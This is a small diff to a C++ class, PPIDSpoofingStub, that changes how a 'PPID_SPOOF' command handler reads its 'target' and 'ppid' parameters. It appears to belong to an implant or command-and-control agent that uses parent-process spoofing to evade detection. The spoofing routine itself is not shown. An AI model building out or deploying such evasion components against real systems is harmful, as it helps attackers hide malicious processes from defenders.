@@ -14,10 +14,11 @@ bool PPIDSpoofingStub::spawn_with_ppid(const std::string& target_exe,
 }
 
 void PPIDSpoofingStub::init() {
-    register_command("PPID_SPOOF", [this](const nlohmann::json& p){
+    register_command("PPID_SPOOF", [this](const nlohmann::json& cmd){
 #ifdef DEBUG
         std::cout << "[DEBUG] PPID_SPOOF command received" << std::endl;
 #endif
+        nlohmann::json p = cmd.value("parameters", nlohmann::json::object());
         if(!p.contains("target") || !p.contains("ppid")) return;
         std::string target = p["target"].get<std::string>();
         uint32_t id = p["ppid"].get<uint32_t>();
